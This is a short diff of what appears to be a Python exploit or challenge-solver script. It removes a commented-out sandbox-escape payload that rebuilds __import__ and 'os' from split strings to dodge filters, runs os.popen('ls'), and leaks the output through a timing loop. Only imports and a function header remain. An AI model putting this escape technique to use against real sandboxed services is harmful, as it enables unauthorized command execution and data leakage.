@@ -1,15 +1,8 @@
 import requests
-import base64 
-import readline 
 import math
 import time
 import sys
 
-
-# for x in ().__class__.__base__.__subclasses__() :
-#     if "warni"+"ng" in x.__name__:
-#         for a in range([0,1000000][x()._module.__builtins__['__imp' + 'ort__']('o'+'s').popen("ls").read()[0] > chr(65)]):
-#             pass
 
 def check(cmd, ich, ch):
 
